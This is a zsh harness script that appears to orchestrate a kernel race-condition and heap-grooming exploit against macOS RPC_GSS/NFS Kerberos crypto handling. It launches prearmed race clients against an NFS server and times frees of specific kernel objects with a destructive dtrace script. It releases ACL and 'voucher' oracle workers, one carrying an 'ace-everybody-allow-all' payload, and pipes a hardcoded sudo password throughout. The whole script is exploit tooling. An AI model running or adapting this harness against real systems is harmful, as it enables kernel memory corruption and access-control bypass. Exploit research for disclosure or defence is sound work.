#!/bin/zsh

set -u

count=${1:-32}
prefix=${2:-/Users/testtest/des3_beta4_wave}
release_gate=${3:-/Users/testtest/des3_beta4.go}
ready_file=${4:-/Users/testtest/des3_beta4.ready}
release_port=${5:-19091}
dtrace_script=${6:-/Users/testtest/trace_cross_digest_live_neighbor_beta4.d}
trace_out=${7:-/Users/testtest/cross_digest_live_neighbor_beta4.dtrace.out}
acl_target=${8:-}
acl_gate=${9:-/Users/testtest/acl_oracle.go}
acl_log=${10:-/Users/testtest/acl_oracle.log}
acl_result=${11:-/Users/testtest/acl_oracle.result.bin}
acl_calls=${12:-64}
acl_workers=${13:-8}
mic_event_gate=${14:-"${trace_out}.mic_alloc"}
acl_mode=${15:-getattr}
acl_release_mode=${16:-mic}
mic_notify_host=${17:-}
mic_notify_port=${18:-0}
voucher_count=${19:-0}
voucher_log=${20:-"${trace_out}.voucher.log"}
voucher_mode=${21:-signal}
voucher_workers=${22:-1}
disable_mic_event_poll=${DISABLE_MIC_EVENT_POLL:-0}
candidate_min_aes_mic=${CANDIDATE_MIN_AES_MIC:-1}
mic_hold_ns=${MIC_HOLD_NS:-50000000}
target_gss_handle=${TARGET_GSS_HANDLE:-0}
target_client_pid=${TARGET_CLIENT_PID:-0}
target_bp_u32=${TARGET_BP_U32:-0}
fdflags_target_ptr=${FDFLAGS_TARGET_PTR:-0}
fdflags_target_pid=${FDFLAGS_TARGET_PID:-0}
fdflags_parent_pid=${FDFLAGS_PARENT_PID:-0}
fdflags_map1_parent_pid=${FDFLAGS_MAP1_PARENT_PID:-${fdflags_parent_pid}}
fdflags_map1_child_pid=${FDFLAGS_MAP1_CHILD_PID:-${fdflags_target_pid}}
fdflags_map1_ptr=${FDFLAGS_MAP1_PTR:-${fdflags_target_ptr}}
fdflags_map2_parent_pid=${FDFLAGS_MAP2_PARENT_PID:-0}
fdflags_map2_child_pid=${FDFLAGS_MAP2_CHILD_PID:-0}
fdflags_map2_ptr=${FDFLAGS_MAP2_PTR:-0}
fdflags_map3_parent_pid=${FDFLAGS_MAP3_PARENT_PID:-0}
fdflags_map3_child_pid=${FDFLAGS_MAP3_CHILD_PID:-0}
fdflags_map3_ptr=${FDFLAGS_MAP3_PTR:-0}
fdflags_map4_parent_pid=${FDFLAGS_MAP4_PARENT_PID:-0}
fdflags_map4_child_pid=${FDFLAGS_MAP4_CHILD_PID:-0}
fdflags_map4_ptr=${FDFLAGS_MAP4_PTR:-0}
fdflags_map5_parent_pid=${FDFLAGS_MAP5_PARENT_PID:-0}
fdflags_map5_child_pid=${FDFLAGS_MAP5_CHILD_PID:-0}
fdflags_map5_ptr=${FDFLAGS_MAP5_PTR:-0}
fdflags_map6_parent_pid=${FDFLAGS_MAP6_PARENT_PID:-0}
fdflags_map6_child_pid=${FDFLAGS_MAP6_CHILD_PID:-0}
fdflags_map6_ptr=${FDFLAGS_MAP6_PTR:-0}
fdflags_map7_parent_pid=${FDFLAGS_MAP7_PARENT_PID:-0}
fdflags_map7_child_pid=${FDFLAGS_MAP7_CHILD_PID:-0}
fdflags_map7_ptr=${FDFLAGS_MAP7_PTR:-0}
fdflags_map8_parent_pid=${FDFLAGS_MAP8_PARENT_PID:-0}
fdflags_map8_child_pid=${FDFLAGS_MAP8_CHILD_PID:-0}
fdflags_map8_ptr=${FDFLAGS_MAP8_PTR:-0}
replacement_ctx_init_hold_ns=${REPLACEMENT_CTX_INIT_HOLD_NS:-0}
replacement_destroy_hold_ns=${REPLACEMENT_DESTROY_HOLD_NS:-0}
pre_destroy_hold_ns=${PRE_DESTROY_HOLD_NS:-0}
prealloc_hold_ns=${PREALLOC_HOLD_NS:-0}
repair_on_fdflags_exact=${REPAIR_ON_FDFLAGS_EXACT:-0}
cchmac_return_hold_ns=${CCHMAC_RETURN_HOLD_NS:-498000000}
candidate_any_target_outer=${CANDIDATE_ANY_TARGET_OUTER:-0}
selective_a_frees_per_target=${SELECTIVE_A_FREES_PER_TARGET:-2}
selective_a_free_slack=${SELECTIVE_A_FREE_SLACK:-0}
defer_last_four=${DEFER_LAST_FOUR:-0}
boost_selective_parents=${BOOST_SELECTIVE_PARENTS:-1}
selective_pid_file=${SELECTIVE_PID_FILE:-}
trace_stderr="${trace_out}.stderr"
notifier_log="${trace_out}.notifier.log"
acl_fanout_log="${trace_out}.acl_fanout.log"
selective_fanout_log="${trace_out}.selective_fanout.log"
data_fanout_log="${trace_out}.data_fanout.log"
pids=()
dtrace_pid=0
trace_tail_pid=0
acl_pids=()
mic_event_pid=0
acl_release_pid=0
voucher_pids=()
voucher_release_pid=0
continue_notifier_pid=0
acl_fanout_pid=0
selective_fanout_pids=()
data_fanout_pids=()
selective_parent_pids=()
selective_fanout_parent_pids=()

cleanup()
{
	trap - EXIT HUP INT TERM
	if [[ ${#pids[@]} -ne 0 ]]; then
		kill ${pids[@]} 2>/dev/null || true
		for pid in ${pids[@]}; do
			wait ${pid} 2>/dev/null || true
		done
	fi
	if (( dtrace_pid > 0 )); then
		printf 'test\n' | sudo -S kill "${dtrace_pid}" \
		    >/dev/null 2>&1 || true
		wait "${dtrace_pid}" 2>/dev/null || true
	fi
	if (( trace_tail_pid > 0 )); then
		kill "${trace_tail_pid}" 2>/dev/null || true
		wait "${trace_tail_pid}" 2>/dev/null || true
	fi
	if (( mic_event_pid > 0 )); then
		kill "${mic_event_pid}" 2>/dev/null || true
		wait "${mic_event_pid}" 2>/dev/null || true
	fi
	if (( acl_release_pid > 0 )); then
		kill "${acl_release_pid}" 2>/dev/null || true
		wait "${acl_release_pid}" 2>/dev/null || true
	fi
	if [[ ${#voucher_pids[@]} -ne 0 ]]; then
		for pid in ${voucher_pids[@]}; do
			kill -TERM "${pid}" 2>/dev/null || true
		done
		for pid in ${voucher_pids[@]}; do
			wait "${pid}" 2>/dev/null || true
		done
	fi
	if (( voucher_release_pid > 0 )); then
		kill -TERM "${voucher_release_pid}" 2>/dev/null || true
		wait "${voucher_release_pid}" 2>/dev/null || true
	fi
	if (( continue_notifier_pid > 0 )); then
		kill -TERM "${continue_notifier_pid}" 2>/dev/null || true
		wait "${continue_notifier_pid}" 2>/dev/null || true
	fi
	if (( acl_fanout_pid > 0 )); then
		kill -TERM "${acl_fanout_pid}" 2>/dev/null || true
		wait "${acl_fanout_pid}" 2>/dev/null || true
	fi
	for pid in ${selective_fanout_pids[@]} ${data_fanout_pids[@]}; do
		kill -TERM "${pid}" 2>/dev/null || true
		wait "${pid}" 2>/dev/null || true
	done
	if [[ ${#acl_pids[@]} -ne 0 ]]; then
		for pid in ${acl_pids[@]}; do
			kill -TERM "${pid}" 2>/dev/null || true
		done
		sleep 0.05
		for pid in ${acl_pids[@]}; do
			if kill -0 "${pid}" 2>/dev/null; then
				kill -KILL "${pid}" 2>/dev/null || true
			fi
			wait "${pid}" 2>/dev/null || true
		done
	fi
}

trap cleanup EXIT HUP INT TERM

if [[ "${selective_a_frees_per_target}" != <-> ||
    "${selective_a_frees_per_target}" -lt 1 ||
    "${selective_a_frees_per_target}" -gt 32 ]]; then
	print -u2 "invalid selective A frees per target: ${selective_a_frees_per_target}"
	exit 2
fi

rm -f "${release_gate}" "${ready_file}" "${trace_stderr}" \
	    "${acl_gate}" "${acl_log}" "${acl_result}" "${mic_event_gate}" \
	    "${voucher_log}" "${notifier_log}" "${acl_fanout_log}" \
	    "${selective_fanout_log}" "${data_fanout_log}" \
	    "${selective_fanout_log}".*(N) "${data_fanout_log}".*(N)
rm -f "${acl_log}".*(N) "${acl_result}".*(N) "${voucher_log}".*(N)
printf 'test\n' | sudo -S rm -f "${trace_out}" >/dev/null 2>&1

if (( count > 0 )); then
	for i in $(seq 0 $((count - 1))); do
		env \
		    KRB5_CONFIG=/Users/testtest/krb5-mit-des3-beta4.conf \
		    KRB5CCNAME=FILE:/Users/testtest/mit_testtest_des3_beta4.ccache \
		    RPC_GSS_PREARM_WAIT_FILE=signal \
		    RPC_GSS_DATA_DELAY_US=800000 \
		    /Users/testtest/rpc_gss_crypto_race_prearmed_gate_signal \
		    192.168.64.84 nfs@tests-virtual-machine.local \
		    "${prefix}_${i}.client.bin" "${prefix}_${i}.server.bin" \
		    0 1 1 0 32768 >"${prefix}_${i}.log" 2>&1 &
		pids+=($!)
	done

	for attempt in $(seq 1 2400); do
		ready=$(grep -l '^race_prearmed_waiting ' "${prefix}"_*.log \
		    2>/dev/null | wc -l | tr -d ' ')
		if [[ ${ready} -eq ${count} ]]; then
			touch "${ready_file}"
			print "des3_existing_wave_ready count=${count}"
			break
		fi
		sleep 0.025
	done

	if [[ ! -e "${ready_file}" ]]; then
		print -u2 "des3_existing_wave_timeout count=${count} ready=${ready}"
		exit 1
	fi
else
	touch "${ready_file}"
	print "des3_existing_wave_ready count=0"
fi

if [[ -n "${acl_target}" ]] && (( acl_workers > 0 )); then
	for worker in $(seq 0 $((acl_workers - 1))); do
		worker_log="${acl_log}.${worker}"
		worker_result="${acl_result}.${worker}"
		if [[ "${acl_mode}" == access ]]; then
			/Users/testtest/aclsig "${acl_target}" signal \
			    "${worker_result}" 8192 "${acl_calls}" \
			    >"${worker_log}" 2>&1 &
			elif [[ "${acl_mode}" == dtrace ]]; then
				/Users/testtest/aclsig "${acl_target}" dtrace_signal \
				    "${worker_result}" 8192 "${acl_calls}" \
				    >"${worker_log}" 2>&1 &
			else
				/Users/testtest/acl_getattr_oracle "${acl_target}" \
			    "${acl_gate}" "${worker_result}" 8192 "${acl_calls}" \
			    >"${worker_log}" 2>&1 &
		fi
		acl_pids+=($!)
	done
	for attempt in $(seq 1 400); do
		ready=$(grep -l '^acl_oracle_waiting ' "${acl_log}".* \
		    2>/dev/null | wc -l | tr -d ' ')
		if [[ ${ready} -eq ${acl_workers} ]]; then
			break
		fi
		sleep 0.025
	done
	if [[ ${ready:-0} -ne ${acl_workers} ]]; then
		print -u2 "acl_oracle_prearm_failed workers=${acl_workers} ready=${ready:-0}"
		cat "${acl_log}".* 2>/dev/null || true
		exit 1
	fi
	print "acl_oracle_ready target=${acl_target} workers=${acl_workers} calls=${acl_calls}"
fi

if [[ -n "${acl_target}" && "${acl_release_mode}" == neighbor &&
    "${acl_mode}" == access && ${#acl_pids[@]} -gt 0 ]]; then
	/Users/testtest/aclbridge ${acl_pids[@]} >"${acl_fanout_log}" 2>&1 &
	acl_fanout_pid=$!
	for attempt in $(seq 1 400); do
		if grep -q '^fanout_ready ' "${acl_fanout_log}" 2>/dev/null; then
			break
		fi
		if ! kill -0 "${acl_fanout_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.025
	done
	if ! grep -q '^fanout_ready ' "${acl_fanout_log}" 2>/dev/null; then
		print -u2 "acl_fanout_prearm_failed"
		cat "${acl_fanout_log}" 2>/dev/null || true
		exit 1
	fi
	print "acl_fanout_ready workers=${acl_workers}"
fi

if [[ -n "${selective_pid_file}" && -s "${selective_pid_file}" ]]; then
	while read -r candidate_pid; do
		if [[ "${candidate_pid}" == <-> ]] && (( candidate_pid > 1 )); then
			selective_parent_pids+=("${candidate_pid}")
		fi
	done <"${selective_pid_file}"
else
	for candidate_pid in \
	    "${fdflags_map1_parent_pid}" "${fdflags_map2_parent_pid}" \
	    "${fdflags_map3_parent_pid}" "${fdflags_map4_parent_pid}" \
	    "${fdflags_map5_parent_pid}" "${fdflags_map6_parent_pid}" \
	    "${fdflags_map7_parent_pid}" "${fdflags_map8_parent_pid}"; do
		if (( candidate_pid > 1 )); then
			selective_parent_pids+=("${candidate_pid}")
		fi
	done
fi
if (( defer_last_four != 0 && ${#selective_parent_pids[@]} > 4 )); then
	selective_fanout_parent_pids=(${selective_parent_pids[1,4]})
else
	selective_fanout_parent_pids=(${selective_parent_pids[@]})
fi
if (( prealloc_hold_ns > 0 && ${#selective_fanout_parent_pids[@]} > 0 )); then
	for relay_index in {0..3}; do
		env DTRACE_FANOUT_POLL_US=50 \
		    /Users/testtest/v32fanout ${selective_fanout_parent_pids[@]} \
		    >"${selective_fanout_log}.${relay_index}" 2>&1 &
		selective_fanout_pids+=($!)
	done
	for attempt in $(seq 1 400); do
		ready=$(grep -l '^fanout_ready ' \
		    "${selective_fanout_log}".* 2>/dev/null |
		    wc -l | tr -d ' ')
		if (( ready == ${#selective_fanout_pids[@]} )); then
			break
		fi
		sleep 0.025
	done
	if (( ${ready:-0} != ${#selective_fanout_pids[@]} )); then
		print -u2 "selective_fanout_prearm_failed"
		cat "${selective_fanout_log}".* 2>/dev/null || true
		exit 1
	fi
	print "selective_fanout_ready relays=${#selective_fanout_pids[@]} targets=${#selective_fanout_parent_pids[@]} total_selective=${#selective_parent_pids[@]} deferred_mode=${defer_last_four}"
fi

if (( target_client_pid > 1 )); then
	for relay_index in {0..3}; do
		env DTRACE_FANOUT_POLL_US=50 DTRACE_FANOUT_TARGET_SIGNAL=28 \
		    /Users/testtest/v32datafanout "${target_client_pid}" \
		    >"${data_fanout_log}.${relay_index}" 2>&1 &
		data_fanout_pids+=($!)
	done
	for attempt in $(seq 1 400); do
		ready=$(grep -l '^fanout_ready ' \
		    "${data_fanout_log}".* 2>/dev/null |
		    wc -l | tr -d ' ')
		if (( ready == ${#data_fanout_pids[@]} )); then
			break
		fi
		sleep 0.025
	done
	if (( ${ready:-0} != ${#data_fanout_pids[@]} )); then
		print -u2 "data_fanout_prearm_failed"
		cat "${data_fanout_log}".* 2>/dev/null || true
		exit 1
	fi
	print "data_fanout_ready relays=${#data_fanout_pids[@]} target=${target_client_pid}"
fi

priority_pids=()
if (( boost_selective_parents != 0 )); then
	priority_pids+=(${selective_parent_pids[@]})
fi
priority_pids+=(${selective_fanout_pids[@]} ${data_fanout_pids[@]})
if (( target_client_pid > 1 )); then
	priority_pids+=("${target_client_pid}")
fi
if (( ${#priority_pids[@]} > 0 )); then
	printf 'test\n' | sudo -S /usr/bin/renice -20 -p \
	    ${priority_pids[@]} >/dev/null 2>&1 ||
	    print -u2 "warning: helper priority boost failed"
	print "priority_boost targets=${#priority_pids[@]} nice=-20 selective_parents=${boost_selective_parents}"
fi

if (( voucher_count > 0 )); then
	for worker in $(seq 0 $((voucher_workers - 1))); do
		worker_log="${voucher_log}.${worker}"
		base_index=$((worker * voucher_count))
		env VOUCHER32_PAYLOAD=ace-everybody-allow-all \
		    /Users/testtest/v32oracle "${voucher_count}" \
		    "${voucher_mode}" "${base_index}" >"${worker_log}" 2>&1 &
		voucher_pids+=($!)
	done
	for attempt in $(seq 1 400); do
		ready=$(grep -l '^voucher_prearmed ' "${voucher_log}".* \
		    2>/dev/null | wc -l | tr -d ' ')
		if [[ ${ready} -eq ${voucher_workers} ]]; then
			break
		fi
		sleep 0.025
	done
	if [[ ${ready:-0} -ne ${voucher_workers} ]]; then
		print -u2 "voucher_oracle_prearm_failed count=${voucher_count} workers=${voucher_workers} ready=${ready:-0}"
		cat "${voucher_log}".* 2>/dev/null || true
		exit 1
	fi
	print "voucher_oracle_ready count=${voucher_count} mode=${voucher_mode} workers=${voucher_workers}"
fi

if [[ -n "${mic_notify_host}" && "${mic_notify_port}" -gt 0 ]]; then
	/Users/testtest/ctxnotify "${mic_notify_host}" "${mic_notify_port}" \
	    >"${notifier_log}" 2>&1 &
	continue_notifier_pid=$!
	for attempt in $(seq 1 400); do
		if grep -q '^notifier_ready ' "${notifier_log}" 2>/dev/null; then
			break
		fi
		if ! kill -0 "${continue_notifier_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.025
	done
	if ! grep -q '^notifier_ready ' "${notifier_log}" 2>/dev/null; then
		print -u2 "continue_notifier_prearm_failed"
		cat "${notifier_log}" 2>/dev/null || true
		exit 1
	fi
	print "continue_notifier_ready host=${mic_notify_host} port=${mic_notify_port}"
fi

printf 'test\n' | sudo -S /usr/bin/script -qF "${trace_out}" \
    /usr/sbin/dtrace -x switchrate=1ms -w -s "${dtrace_script}" \
    "${candidate_min_aes_mic}" \
    "${mic_hold_ns}" "${target_gss_handle}" \
    "${fdflags_target_ptr}" "${fdflags_target_pid}" \
    "${fdflags_parent_pid}" \
    "${fdflags_map1_parent_pid}" "${fdflags_map1_child_pid}" \
    "${fdflags_map1_ptr}" \
    "${fdflags_map2_parent_pid}" "${fdflags_map2_child_pid}" \
    "${fdflags_map2_ptr}" \
    "${fdflags_map3_parent_pid}" "${fdflags_map3_child_pid}" \
    "${fdflags_map3_ptr}" \
    "${fdflags_map4_parent_pid}" "${fdflags_map4_child_pid}" \
    "${fdflags_map4_ptr}" \
    "${fdflags_map5_parent_pid}" "${fdflags_map5_child_pid}" \
    "${fdflags_map5_ptr}" \
    "${fdflags_map6_parent_pid}" "${fdflags_map6_child_pid}" \
    "${fdflags_map6_ptr}" \
    "${fdflags_map7_parent_pid}" "${fdflags_map7_child_pid}" \
    "${fdflags_map7_ptr}" \
	    "${fdflags_map8_parent_pid}" "${fdflags_map8_child_pid}" \
	    "${fdflags_map8_ptr}" \
	    "${replacement_ctx_init_hold_ns}" \
	    "${prealloc_hold_ns}" \
	    "${target_client_pid}" \
	    "${target_bp_u32}" \
	    "${replacement_destroy_hold_ns}" \
	    "${repair_on_fdflags_exact}" \
	    "${cchmac_return_hold_ns}" \
	    "${candidate_any_target_outer}" \
	    "${selective_a_frees_per_target}" \
	    "${defer_last_four}" \
	    "${pre_destroy_hold_ns}" \
	    "${selective_a_free_slack}" \
	    >"${trace_stderr}" 2>&1 &
dtrace_pid=$!

for attempt in $(seq 1 800); do
	if grep -q trace_begin "${trace_out}" 2>/dev/null; then
		break
	fi
	sleep 0.025
done

if ! grep -q trace_begin "${trace_out}" 2>/dev/null; then
	print -u2 "dtrace_start_failed"
	cat "${trace_stderr}" 2>/dev/null || true
	exit 1
fi

print "=== live_dtrace_stream ==="
tail -n +1 -f "${trace_out}" &
trace_tail_pid=$!

	if (( voucher_count > 0 )); then
		(
			for attempt in $(seq 1 12000); do
			if grep -q ' EXACT_ACL32_AUTH_ENTRY ' \
			    "${trace_out}" 2>/dev/null; then
				kill -USR1 ${voucher_pids[@]} 2>/dev/null || true
				print "voucher_oracle_acl_released count=${voucher_count} workers=${voucher_workers}"
				exit 0
			fi
			if grep -q ' trace_end ' "${trace_out}" 2>/dev/null; then
				print -u2 "voucher_oracle_no_acl_target"
				exit 1
			fi
			sleep 0.001
		done
		print -u2 "voucher_oracle_acl_timeout"
		exit 1
	) &
	voucher_release_pid=$!
fi

if [[ "${disable_mic_event_poll}" != 1 ]]; then
	(
		for attempt in $(seq 1 120000); do
			if grep -Eq ' (MIC_ALLOC_ASYNC|mic_alloc) ' \
			    "${trace_out}" 2>/dev/null; then
			if [[ -n "${acl_target}" &&
			    "${acl_release_mode}" == mic ]]; then
				if [[ "${acl_mode}" == access ]]; then
					kill -USR1 ${acl_pids[@]} 2>/dev/null || true
				else
					touch "${acl_gate}"
				fi
			fi
			touch "${mic_event_gate}"
			if [[ -n "${mic_notify_host}" &&
			    "${mic_notify_port}" -gt 0 &&
			    "${continue_notifier_pid}" -eq 0 ]]; then
				printf x | nc -w 1 "${mic_notify_host}" \
				    "${mic_notify_port}" >/dev/null 2>&1 || true
				print "mic_alloc_network_notified host=${mic_notify_host} port=${mic_notify_port}"
			fi
			print "mic_alloc_event_released gate=${mic_event_gate}"
			exit 0
		fi
		if grep -q ' trace_end ' "${trace_out}" 2>/dev/null; then
			if [[ -n "${acl_target}" &&
			    "${acl_release_mode}" == mic ]]; then
				if [[ "${acl_mode}" == access ]]; then
					kill -USR1 ${acl_pids[@]} 2>/dev/null || true
				else
					touch "${acl_gate}"
				fi
			fi
			touch "${mic_event_gate}"
			print -u2 "mic_alloc_event_no_target gate=${mic_event_gate}"
			exit 1
		fi
		sleep 0.001
	done
	if [[ -n "${acl_target}" && "${acl_release_mode}" == mic ]]; then
		if [[ "${acl_mode}" == access ]]; then
			kill -USR1 ${acl_pids[@]} 2>/dev/null || true
		else
			touch "${acl_gate}"
		fi
	fi
	touch "${mic_event_gate}"
	print -u2 "mic_alloc_event_timeout gate=${mic_event_gate}"
	exit 1
	) &
	mic_event_pid=$!
else
	print "mic_alloc_event_poll=disabled"
fi

print "supervisor_ready release_port=${release_port}"
nc -l "${release_port}" >/dev/null
if [[ -n "${acl_target}" && "${acl_release_mode}" == pre ]]; then
	if [[ "${acl_mode}" == access ]]; then
		kill -USR1 ${acl_pids[@]} 2>/dev/null || true
	else
		touch "${acl_gate}"
	fi
	print "acl_oracle_pre_released mode=${acl_mode}"
elif [[ -n "${acl_target}" &&
    "${acl_release_mode}" == delay:* ]]; then
	(
		sleep "${acl_release_mode#delay:}"
		if [[ "${acl_mode}" == access ]]; then
			kill -USR1 ${acl_pids[@]} 2>/dev/null || true
		else
			touch "${acl_gate}"
		fi
		print "acl_oracle_delay_released mode=${acl_mode} delay=${acl_release_mode#delay:}"
	) &
	acl_release_pid=$!
elif [[ -n "${acl_target}" &&
    "${acl_release_mode}" == des3 ]]; then
	(
		for attempt in $(seq 1 12000); do
			if grep -q ' EXACT_DES3_ABA ' "${trace_out}" 2>/dev/null; then
				if [[ "${acl_mode}" == access ]]; then
					kill -USR1 ${acl_pids[@]} 2>/dev/null || true
				else
					touch "${acl_gate}"
				fi
				print "acl_oracle_des3_released mode=${acl_mode}"
				exit 0
			fi
			if grep -q ' trace_end ' "${trace_out}" 2>/dev/null; then
				print -u2 "acl_oracle_des3_no_target"
				exit 1
			fi
			sleep 0.001
		done
		print -u2 "acl_oracle_des3_timeout"
		exit 1
	) &
	acl_release_pid=$!
elif [[ -n "${acl_target}" &&
    "${acl_release_mode}" == neighbor &&
    "${acl_mode}" == access ]]; then
	print "acl_oracle_neighbor_release=dtrace_direct"
elif [[ -n "${acl_target}" &&
    "${acl_release_mode}" == neighbor ]]; then
	(
		for attempt in $(seq 1 12000); do
			if grep -Eq ' EXACT_(32_NEIGHBOR|SELECTED_B)_FREED ' \
			    "${trace_out}" 2>/dev/null; then
				kill -USR1 ${acl_pids[@]} 2>/dev/null || true
				print "acl_oracle_neighbor_released mode=${acl_mode}"
				exit 0
			fi
			if grep -q ' trace_end ' "${trace_out}" 2>/dev/null; then
				print -u2 "acl_oracle_neighbor_no_target"
				exit 1
			fi
			sleep 0.001
		done
		print -u2 "acl_oracle_neighbor_timeout"
		exit 1
	) &
	acl_release_pid=$!
fi
for pid in ${pids[@]}; do
	kill -USR1 "${pid}"
done
print "supervisor_released"

for pid in ${pids[@]}; do
	wait "${pid}" || true
done
pids=()

if (( acl_release_pid > 0 )); then
	wait "${acl_release_pid}" 2>/dev/null || true
	acl_release_pid=0
fi

for pid in ${acl_pids[@]}; do
	for attempt in $(seq 1 40); do
		if ! kill -0 "${pid}" 2>/dev/null; then
			break
		fi
		sleep 0.025
	done
	if kill -0 "${pid}" 2>/dev/null; then
		kill -TERM "${pid}" 2>/dev/null || true
	fi
	wait "${pid}" 2>/dev/null || true
done
acl_pids=()

if (( acl_fanout_pid > 0 )); then
	kill -TERM "${acl_fanout_pid}" 2>/dev/null || true
	wait "${acl_fanout_pid}" 2>/dev/null || true
	acl_fanout_pid=0
fi

for pid in ${selective_fanout_pids[@]} ${data_fanout_pids[@]}; do
	if kill -0 "${pid}" 2>/dev/null; then
		kill -TERM "${pid}" 2>/dev/null || true
	fi
	wait "${pid}" 2>/dev/null || true
done
selective_fanout_pids=()
data_fanout_pids=()

if [[ ${#voucher_pids[@]} -ne 0 ]]; then
	if (( voucher_release_pid > 0 )); then
		wait "${voucher_release_pid}" 2>/dev/null || true
		voucher_release_pid=0
	fi
	for pid in ${voucher_pids[@]}; do
		if kill -0 "${pid}" 2>/dev/null &&
		    grep -q ' trace_end ' "${trace_out}" 2>/dev/null; then
			kill -TERM "${pid}" 2>/dev/null || true
			fi
			wait "${pid}" 2>/dev/null || true
		done
		voucher_pids=()
	fi

if (( mic_event_pid > 0 )); then
	wait "${mic_event_pid}" 2>/dev/null || true
	mic_event_pid=0
fi
wait "${dtrace_pid}" 2>/dev/null || true
dtrace_pid=0
if (( continue_notifier_pid > 0 )); then
	for attempt in $(seq 1 40); do
		if ! kill -0 "${continue_notifier_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.025
	done
	if kill -0 "${continue_notifier_pid}" 2>/dev/null; then
		kill -TERM "${continue_notifier_pid}" 2>/dev/null || true
	fi
	wait "${continue_notifier_pid}" 2>/dev/null || true
	continue_notifier_pid=0
fi
kill "${trace_tail_pid}" 2>/dev/null || true
wait "${trace_tail_pid}" 2>/dev/null || true
trace_tail_pid=0
printf 'test\n' | sudo -S chown testtest:staff "${trace_out}" \
    >/dev/null 2>&1 || true

print "=== remote_dtrace ==="
cat "${trace_out}" 2>/dev/null || true
print "=== remote_dtrace_stderr ==="
cat "${trace_stderr}" 2>/dev/null || true
if [[ -n "${acl_target}" ]]; then
	print "=== acl_oracle ==="
	acl_logs=("${acl_log}".*(N))
	if (( ${#acl_logs[@]} > 0 )); then
		cat "${acl_logs[@]}" 2>/dev/null || true
	else
		print "acl_oracle_no_logs"
	fi
fi
if (( voucher_count > 0 )); then
	print "=== voucher_oracle ==="
	voucher_logs=("${voucher_log}".*(N))
	if (( ${#voucher_logs[@]} > 0 )); then
		cat "${voucher_logs[@]}" 2>/dev/null || true
	else
		print "voucher_oracle_no_logs"
	fi
fi
if [[ -s "${notifier_log}" ]]; then
	print "=== continue_notifier ==="
	cat "${notifier_log}" 2>/dev/null || true
fi
selective_fanout_logs=("${selective_fanout_log}".*(N))
if (( ${#selective_fanout_logs[@]} > 0 )); then
	print "=== selective_fanout ==="
	cat "${selective_fanout_logs[@]}" 2>/dev/null || true
fi
data_fanout_logs=("${data_fanout_log}".*(N))
if (( ${#data_fanout_logs[@]} > 0 )); then
	print "=== data_fanout ==="
	cat "${data_fanout_logs[@]}" 2>/dev/null || true
fi
print "des3_existing_wave_done count=${count}"
